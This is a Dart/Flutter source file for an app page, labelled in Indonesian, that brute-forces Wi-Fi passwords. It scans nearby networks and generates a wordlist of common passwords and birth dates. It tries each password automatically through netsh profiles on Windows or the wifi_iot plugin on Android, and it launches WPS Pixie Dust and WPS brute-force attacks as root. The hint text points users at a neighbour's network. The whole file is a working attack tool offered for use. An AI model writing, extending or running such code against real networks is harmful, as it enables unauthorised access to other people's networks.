import 'dart:io';
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:path_provider/path_provider.dart';
import 'package:iconsax/iconsax.dart';
import 'package:wifi_iot/wifi_iot.dart';
import 'package:permission_handler/permission_handler.dart';

class WifiBruteforcePage extends StatefulWidget {
  const WifiBruteforcePage({super.key});

  @override
  State<WifiBruteforcePage> createState() => _WifiBruteforcePageState();
}

class _WifiBruteforcePageState extends State<WifiBruteforcePage> {
  final TextEditingController _ssidController = TextEditingController();
  final TextEditingController _bssidController = TextEditingController();
  final TextEditingController _interfaceController = TextEditingController(text: 'wlan0');

  String _selectedAttackMode = 'WPA2 Wordlist'; // 'WPA2 Wordlist', 'WPS Pixie Dust', 'WPS Bruteforce'
  Map<String, String> _ssidToBssid = {};

  bool _isAttacking = false;
  bool _shouldStop = false;
  bool _isScanningWifi = false;
  List<String> _logs = [];
  String _foundPassword = '';
  List<String> _nearbyNetworks = [];


  static const Color bgDark = Color(0xFF090D14);
  static const Color surfaceCard = Color(0xFF1A2438);
  static const Color borderSoft = Color(0xFF212B3D);
  static const Color accentCyan = Color(0xFF0EA5E9);
  static const Color accentIndigo = Color(0xFF6366F1);
  static const Color textMain = Color(0xFFE2E8F0);
  static const Color textMuted = Color(0xFF94A3B8);
  static const Color bloodRed = Color(0xFFEF4444);
  static const Color successGreen = Color(0xFF52B788);

  @override
  void initState() {
    super.initState();
    _scanNearbyNetworks();
  }

  Future<void> _scanNearbyNetworks() async {
    setState(() {
      _isScanningWifi = true;
    });

    try {
      final List<String> networks = [];

      if (Platform.isWindows) {
        final result = await Process.run('netsh', ['wlan', 'show', 'networks']);
        final output = result.stdout.toString();
        final lines = output.split('\n');

        for (var line in lines) {
          if (line.trim().startsWith('SSID') && line.contains(':')) {
            final parts = line.split(':');
            if (parts.length > 1) {
              final ssid = parts[1].trim();
              if (ssid.isNotEmpty && !networks.contains(ssid)) {
                networks.add(ssid);
              }
            }
          }
        }
      } else if (Platform.isAndroid) {
        final status = await Permission.location.request();
        if (status.isGranted) {
          try {
            final wifis = await WiFiForIoTPlugin.loadWifiList();
            if (wifis != null) {
              for (var wifi in wifis) {
                if (wifi.ssid != null &&
                    wifi.ssid!.isNotEmpty &&
                    !networks.contains(wifi.ssid!)) {
                  networks.add(wifi.ssid!);
                  try {
                    final bssid = wifi.bssid;
                    if (bssid != null) {
                      _ssidToBssid[wifi.ssid!] = bssid;
                    }
                  } catch (_) {}
                }
              }
            }
          } catch (e) {
            _addLog('Gagal ambil list WiFi Android: $e');
          }
        } else {
          _showAlert(
            'Izin Ditolak',
            'Akses lokasi diperlukan untuk melakukan scan WiFi di Android.',
          );
        }
      } else {
        _addLog('Platform tidak didukung untuk scan WiFi.');
      }

      setState(() {
        _nearbyNetworks = networks;
      });
      if (networks.isNotEmpty && _ssidController.text.isEmpty) {
        _ssidController.text = networks.first;
      }
    } catch (e) {
      _addLog('Gagal scan WiFi sekitar: $e');
    } finally {
      setState(() {
        _isScanningWifi = false;
      });
    }
  }

  @override
  void dispose() {
    _ssidController.dispose();
    _bssidController.dispose();
    _interfaceController.dispose();
    super.dispose();
  }

  void _addLog(String message) {
    setState(() {
      _logs.add('[${DateTime.now().toString().substring(11, 19)}] $message');
      if (_logs.length > 50) _logs.removeAt(0); // Keep last 50 logs
    });
  }

  Future<void> _startBruteforce() async {
    final ssid = _ssidController.text.trim();

    if (ssid.isEmpty) {
      _showAlert('Error', 'Target SSID tidak boleh kosong!');
      return;
    }

    if (_selectedAttackMode != 'WPA2 Wordlist' && Platform.isWindows) {
      _showAlert(
        'Tidak Didukung',
        'Serangan WPS saat ini hanya didukung di Android (Rooted).',
      );
      return;
    }

    if (_selectedAttackMode == 'WPS Pixie Dust') {
      _startWpsPixieDust();
      return;
    } else if (_selectedAttackMode == 'WPS Bruteforce') {
      _startWpsBruteforce();
      return;
    }

    if (!Platform.isWindows && !Platform.isAndroid) {
      _showAlert(
        'Tidak Didukung',
        'Fitur ini hanya didukung di Windows dan Android.',
      );
      return;
    }

    setState(() {
      _isAttacking = true;
      _shouldStop = false;
      _foundPassword = '';
      _logs.clear();
    });

    _addLog('Memulai operasi Brute-Force pada SSID: $ssid');


    if (Platform.isAndroid) {
      final status = await Permission.location.request();
      if (!status.isGranted) {
        _showAlert(
          'Izin Ditolak',
          'Akses lokasi diperlukan untuk mengatur WiFi di Android.',
        );
        setState(() {
          _isAttacking = false;
        });
        return;
      }
    }


    List<String> basePasswords = [
      '12345678',
      '123456789',
      '1234567890',
      'password',
      'password123',
      'admin123',
      'admin1234',
      'admin12345',
      'qwertyuiop',
      '11223344',
      '12341234',
      '123123123',
      '00000000',
      '11111111',
      '88888888',
      '99999999',
      'indihome123',
      'indihome',
      'internet',
      'internet123',
      'wifi1234',
      ssid,
      '${ssid}123',
      '${ssid}1234',
      '${ssid}12345',
      ssid.toLowerCase(),
      '${ssid.toLowerCase()}123',
    ];


    for (int y = 1990; y <= 2015; y++) {
      for (int m = 1; m <= 12; m++) {
        for (int d = 1; d <= 31; d++) {
          String dd = d.toString().padLeft(2, '0');
          String mm = m.toString().padLeft(2, '0');
          String yyyy = y.toString();
          basePasswords.add('$dd$mm$yyyy');
        }
      }
    }


    final passwords = basePasswords
        .where((p) => p.length >= 8)
        .toSet()
        .toList();

    _addLog('📂 Total kombinasi kata sandi dibuat: ${passwords.length}');

    for (int i = 0; i < passwords.length; i++) {
      if (_shouldStop) {
        _addLog('🛑 Serangan dihentikan manual.');
        break;
      }

      final pass = passwords[i];
      if (pass.length < 8) {
        _addLog('⚠️ Melewati "$pass" (kurang dari 8 karakter)');
        continue;
      }

      _addLog('🔄 Mencoba: $pass (${i + 1}/${passwords.length})');

      bool success = false;
      if (Platform.isWindows) {
        success = await _tryPasswordWindows(ssid, pass);
      } else if (Platform.isAndroid) {
        success = await _tryPasswordAndroid(ssid, pass);
      }

      if (success) {
        _addLog('✅ BERHASIL! Password ditemukan: $pass');
        setState(() {
          _foundPassword = pass;
        });
        break;
      } else {
        _addLog('❌ Gagal: $pass');
      }
    }

    if (_foundPassword.isEmpty && !_shouldStop) {
      _addLog('🏁 Selesai. Password tidak ditemukan di wordlist.');
    }

    setState(() {
      _isAttacking = false;
    });
  }

  Future<void> _startWpsPixieDust() async {
    final bssid = _bssidController.text.trim();
    final interface = _interfaceController.text.trim();

    if (bssid.isEmpty) {
      _showAlert('Error', 'Target BSSID tidak boleh kosong!');
      return;
    }

    setState(() {
      _isAttacking = true;
      _logs.clear();
    });

    _addLog('Memulai serangan WPS Pixie Dust pada BSSID: $bssid');
    
    try {
      _addLog('Menjalankan: su -c "python3 main.py -i $interface -b $bssid -K"');
      final result = await Process.run('su', ['-c', 'python3 main.py -i $interface -b $bssid -K']);
      
      if (result.stdout.toString().isNotEmpty) {
        _addLog(result.stdout.toString());
      }
      if (result.stderr.toString().isNotEmpty) {
        _addLog('Error: ${result.stderr}');
      }
      
      _addLog('🏁 Selesai. Periksa output di atas.');
    } catch (e) {
      _addLog('Gagal menjalankan perintah: $e');
      _addLog('Pastikan Python dan wipwn terinstall di lingkungan root.');
    }
    
    setState(() {
      _isAttacking = false;
    });
  }

  Future<void> _startWpsBruteforce() async {
    final bssid = _bssidController.text.trim();
    final interface = _interfaceController.text.trim();

    if (bssid.isEmpty) {
      _showAlert('Error', 'Target BSSID tidak boleh kosong!');
      return;
    }

    setState(() {
      _isAttacking = true;
      _logs.clear();
    });

    _addLog('Memulai serangan WPS Bruteforce pada BSSID: $bssid');
    
    try {
      _addLog('Menjalankan: su -c "python3 main.py -i $interface -b $bssid -B"');
      final result = await Process.run('su', ['-c', 'python3 main.py -i $interface -b $bssid -B']);
      
      if (result.stdout.toString().isNotEmpty) {
        _addLog(result.stdout.toString());
      }
      if (result.stderr.toString().isNotEmpty) {
        _addLog('Error: ${result.stderr}');
      }
      
      _addLog('🏁 Selesai. Periksa output di atas.');
    } catch (e) {
      _addLog('Gagal menjalankan perintah: $e');
      _addLog('Pastikan Python dan wipwn terinstall di lingkungan root.');
    }
    
    setState(() {
      _isAttacking = false;
    });
  }

  void _stopBruteforce() {
    setState(() {
      _shouldStop = true;
    });
  }

  Future<bool> _tryPasswordWindows(String ssid, String password) async {
    try {
      final tempDir = await getTemporaryDirectory();
      final profileFile = File('${tempDir.path}\\manta_wifi_profile.xml');


      final xml =
          '''<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>$ssid</name>
    <SSIDConfig>
        <SSID>
            <name>$ssid</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>manual</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>$password</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>''';

      await profileFile.writeAsString(xml);


      await Process.run('netsh', [
        'wlan',
        'add',
        'profile',
        'filename="${profileFile.path}"',
      ]);


      await Process.run('netsh', ['wlan', 'connect', 'name="$ssid"']);

      bool isConnected = false;

      for (int i = 0; i < 10; i++) {
        await Future.delayed(const Duration(milliseconds: 500));

        final statusResult = await Process.run('netsh', [
          'wlan',
          'show',
          'interfaces',
        ]);
        final output = statusResult.stdout.toString().toLowerCase();

        if (output.contains(' state') &&
            output.contains('connected') &&
            output.contains(ssid.toLowerCase())) {
          isConnected = true;
          break;
        }
      }


      await Process.run('netsh', ['wlan', 'delete', 'profile', 'name="$ssid"']);

      return isConnected;
    } catch (e) {
      _addLog('Error sistem: $e');
      return false;
    }
  }

  Future<bool> _tryPasswordAndroid(String ssid, String password) async {
    try {

      await WiFiForIoTPlugin.disconnect();
      await Future.delayed(const Duration(milliseconds: 500));

      _addLog('🔄 Menghubungkan ke $ssid...');
      
      final connected = await WiFiForIoTPlugin.connect(
        ssid,
        password: password,
        security: NetworkSecurity.WPA,
        joinOnce: false,
        withInternet: false,
      );

      _addLog('ℹ️ Hasil API Connect: $connected');


      for (int i = 0; i < 10; i++) {
        await Future.delayed(const Duration(seconds: 1));
        
        try {
          final currentSsid = await WiFiForIoTPlugin.getSSID();

          if (currentSsid == ssid || currentSsid == '"$ssid"') {
            _addLog('✅ Terkonfirmasi tersambung ke: $currentSsid');
            return true;
          }
        } catch (e) {

        }
      }



      return connected;
    } catch (e) {
      _addLog('Error otentikasi Android: $e');
      return false;
    }
  }

  void _showAlert(String title, String message) {
    showDialog(
      context: context,
      builder: (_) => BackdropFilter(
        filter: ImageFilter.blur(sigmaX: 10, sigmaY: 10),
        child: AlertDialog(
          backgroundColor: surfaceCard,
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(15),
            side: const BorderSide(color: borderSoft),
          ),
          title: Text(
            title,
            style: const TextStyle(color: Colors.white, fontFamily: 'Orbitron'),
          ),
          content: Text(message, style: const TextStyle(color: textMuted)),
          actions: [
            TextButton(
              onPressed: () => Navigator.pop(context),
              child: const Text('OK', style: TextStyle(color: accentCyan)),
            ),
          ],
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: bgDark,
      appBar: AppBar(
        backgroundColor: Colors.transparent,
        elevation: 0,
        leading: IconButton(
          icon: const Icon(
            Icons.arrow_back_ios_new,
            color: accentCyan,
            size: 20,
          ),
          onPressed: () => Navigator.pop(context),
        ),
        title: const Text(
          "WIFI BRUTE-FORCE (WPA2)",
          style: TextStyle(
            color: Colors.white,
            fontFamily: 'Orbitron',
            fontSize: 16,
            fontWeight: FontWeight.bold,
            letterSpacing: 1.2,
          ),
        ),
        centerTitle: true,
      ),
      body: Padding(
        padding: const EdgeInsets.all(20),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.stretch,
          children: [
            Container(
              padding: const EdgeInsets.all(16),
              decoration: BoxDecoration(
                color: surfaceCard,
                borderRadius: BorderRadius.circular(16),
                border: Border.all(color: borderSoft),
              ),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Row(
                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
                    children: [
                      const Text(
                        "TARGET SSID",
                        style: TextStyle(
                          color: accentCyan,
                          fontSize: 12,
                          fontWeight: FontWeight.bold,
                          fontFamily: 'Orbitron',
                        ),
                      ),
                      InkWell(
                        onTap: _isScanningWifi ? null : _scanNearbyNetworks,
                        child: Row(
                          children: [
                            if (_isScanningWifi)
                              const SizedBox(
                                width: 12,
                                height: 12,
                                child: CircularProgressIndicator(
                                  color: accentCyan,
                                  strokeWidth: 2,
                                ),
                              )
                            else
                              const Icon(
                                Icons.refresh,
                                color: accentCyan,
                                size: 14,
                              ),
                            const SizedBox(width: 4),
                            Text(
                              _isScanningWifi ? "SCANNING..." : "RESCAN",
                              style: TextStyle(
                                color: accentCyan,
                                fontSize: 10,
                                fontWeight: FontWeight.bold,
                                fontFamily: 'Orbitron',
                              ),
                            ),
                          ],
                        ),
                      ),
                    ],
                  ),
                  const SizedBox(height: 8),

                  Container(
                    padding: const EdgeInsets.symmetric(horizontal: 12),
                    decoration: BoxDecoration(
                      color: Colors.white.withOpacity(0.05),
                      borderRadius: BorderRadius.circular(8),
                      border: Border.all(color: borderSoft),
                    ),
                    child: DropdownButtonHideUnderline(
                      child: DropdownButton<String>(
                        value: _selectedAttackMode,
                        dropdownColor: surfaceCard,
                        isExpanded: true,
                        style: const TextStyle(color: Colors.white, fontFamily: 'Orbitron', fontSize: 12),
                        items: <String>['WPA2 Wordlist', 'WPS Pixie Dust', 'WPS Bruteforce']
                            .map<DropdownMenuItem<String>>((String value) {
                          return DropdownMenuItem<String>(
                            value: value,
                            child: Text(value),
                          );
                        }).toList(),
                        onChanged: _isAttacking ? null : (String? newValue) {
                          setState(() {
                            _selectedAttackMode = newValue!;
                          });
                        },
                      ),
                    ),
                  ),
                  const SizedBox(height: 12),
                  TextField(
                    controller: _ssidController,
                    style: const TextStyle(color: Colors.white),
                    enabled: !_isAttacking,
                    decoration: InputDecoration(
                      hintText: "Contoh: WiFi_Tetangga",
                      hintStyle: TextStyle(color: textMuted.withOpacity(0.5)),
                      border: InputBorder.none,
                      icon: const Icon(Iconsax.wifi, color: textMuted),
                    ),
                  ),
                  if (_selectedAttackMode != 'WPA2 Wordlist') ...[
                    const Divider(color: borderSoft),
                    TextField(
                      controller: _bssidController,
                      style: const TextStyle(color: Colors.white, fontFamily: 'ShareTechMono'),
                      enabled: !_isAttacking,
                      decoration: InputDecoration(
                        hintText: "BSSID (Contoh: AA:BB:CC:DD:EE:FF)",
                        hintStyle: TextStyle(color: textMuted.withOpacity(0.5)),
                        border: InputBorder.none,
                        icon: const Icon(Iconsax.link, color: textMuted),
                      ),
                    ),
                    const Divider(color: borderSoft),
                    TextField(
                      controller: _interfaceController,
                      style: const TextStyle(color: Colors.white, fontFamily: 'ShareTechMono'),
                      enabled: !_isAttacking,
                      decoration: InputDecoration(
                        hintText: "Interface (Contoh: wlan0)",
                        hintStyle: TextStyle(color: textMuted.withOpacity(0.5)),
                        border: InputBorder.none,
                        icon: const Icon(Iconsax.setting_4, color: textMuted),
                      ),
                    ),
                  ],
                  if (_nearbyNetworks.isNotEmpty) ...[
                    const Divider(color: borderSoft),
                    const SizedBox(height: 4),
                    Text(
                      "Pilih WiFi Terdekat:",
                      style: TextStyle(
                        color: textMuted,
                        fontSize: 10,
                        fontFamily: 'Orbitron',
                      ),
                    ),
                    const SizedBox(height: 8),
                    Wrap(
                      spacing: 8,
                      runSpacing: 8,
                      children: _nearbyNetworks.map((net) {
                        return InkWell(
                          onTap: () {
                            if (!_isAttacking) {
                              setState(() {
                                _ssidController.text = net;
                                final bssid = _ssidToBssid[net];
                                if (bssid != null) {
                                  _bssidController.text = bssid;
                                }
                              });
                            }
                          },
                          child: Container(
                            padding: const EdgeInsets.symmetric(
                              horizontal: 10,
                              vertical: 6,
                            ),
                            decoration: BoxDecoration(
                              color: _ssidController.text == net
                                  ? accentCyan.withOpacity(0.2)
                                  : Colors.white.withOpacity(0.05),
                              borderRadius: BorderRadius.circular(8),
                              border: Border.all(
                                color: _ssidController.text == net
                                    ? accentCyan
                                    : borderSoft,
                              ),
                            ),
                            child: Text(
                              net,
                              style: TextStyle(
                                color: _ssidController.text == net
                                    ? accentCyan
                                    : textMuted,
                                fontSize: 11,
                                fontFamily: 'ShareTechMono',
                              ),
                            ),
                          ),
                        );
                      }).toList(),
                    ),
                  ],
                ],
              ),
            ),

            Expanded(
              flex: 2,
              child: Container(
                padding: const EdgeInsets.all(16),
                decoration: BoxDecoration(
                  color: Colors.black.withOpacity(0.5),
                  borderRadius: BorderRadius.circular(16),
                  border: Border.all(color: borderSoft),
                ),
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Row(
                      mainAxisAlignment: MainAxisAlignment.spaceBetween,
                      children: [
                        const Text(
                          "TERMINAL LOG",
                          style: TextStyle(
                            color: textMuted,
                            fontSize: 10,
                            fontWeight: FontWeight.bold,
                            fontFamily: 'Orbitron',
                          ),
                        ),
                        if (_isAttacking)
                          const SizedBox(
                            width: 12,
                            height: 12,
                            child: CircularProgressIndicator(
                              color: accentCyan,
                              strokeWidth: 2,
                            ),
                          ),
                      ],
                    ),
                    const Divider(color: borderSoft),
                    Expanded(
                      child: ListView.builder(
                        itemCount: _logs.length,
                        itemBuilder: (context, index) {
                          final log =
                              _logs[_logs.length - 1 - index]; // reverse order
                          Color logColor = textMuted;
                          if (log.contains('BERHASIL')) logColor = successGreen;
                          if (log.contains('Gagal'))
                            logColor = bloodRed.withOpacity(0.8);
                          if (log.contains('Mencoba'))
                            logColor = Colors.yellow.withOpacity(0.8);

                          return Padding(
                            padding: const EdgeInsets.only(bottom: 4),
                            child: Text(
                              log,
                              style: TextStyle(
                                color: logColor,
                                fontFamily: 'ShareTechMono',
                                fontSize: 11,
                              ),
                            ),
                          );
                        },
                      ),
                    ),
                  ],
                ),
              ),
            ),
            const SizedBox(height: 20),


            if (_foundPassword.isNotEmpty)
              Container(
                margin: const EdgeInsets.only(bottom: 16),
                padding: const EdgeInsets.all(16),
                decoration: BoxDecoration(
                  color: successGreen.withOpacity(0.1),
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(color: successGreen),
                ),
                child: Row(
                  children: [
                    const Icon(Iconsax.unlock, color: successGreen),
                    const SizedBox(width: 16),
                    Expanded(
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          const Text(
                            'PASSWORD DITEMUKAN!',
                            style: TextStyle(
                              color: successGreen,
                              fontWeight: FontWeight.bold,
                            ),
                          ),
                          Text(
                            _foundPassword,
                            style: const TextStyle(
                              color: Colors.white,
                              fontSize: 18,
                              fontWeight: FontWeight.bold,
                              fontFamily: 'ShareTechMono',
                            ),
                          ),
                        ],
                      ),
                    ),
                  ],
                ),
              ),


            _isAttacking
                ? ElevatedButton(
                    onPressed: _stopBruteforce,
                    style: ElevatedButton.styleFrom(
                      backgroundColor: bloodRed.withOpacity(0.1),
                      foregroundColor: bloodRed,
                      padding: const EdgeInsets.symmetric(vertical: 18),
                      shape: RoundedRectangleBorder(
                        borderRadius: BorderRadius.circular(15),
                        side: BorderSide(color: bloodRed.withOpacity(0.5)),
                      ),
                    ),
                    child: const Row(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        Icon(Icons.stop_rounded),
                        SizedBox(width: 10),
                        Text(
                          "STOP BRUTE-FORCE",
                          style: TextStyle(
                            fontFamily: 'Orbitron',
                            fontWeight: FontWeight.bold,
                          ),
                        ),
                      ],
                    ),
                  )
                : ElevatedButton(
                    onPressed: _startBruteforce,
                    style: ElevatedButton.styleFrom(
                      backgroundColor: accentCyan.withOpacity(0.1),
                      foregroundColor: accentCyan,
                      padding: const EdgeInsets.symmetric(vertical: 18),
                      shape: RoundedRectangleBorder(
                        borderRadius: BorderRadius.circular(15),
                        side: BorderSide(color: accentCyan.withOpacity(0.5)),
                      ),
                    ),
                    child: const Row(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        Icon(Icons.bolt_rounded),
                        SizedBox(width: 10),
                        Text(
                          "START BRUTE-FORCE",
                          style: TextStyle(
                            fontFamily: 'Orbitron',
                            fontWeight: FontWeight.bold,
                          ),
                        ),
                      ],
                    ),
                  ),
          ],
        ),
      ),
    );
  }
}
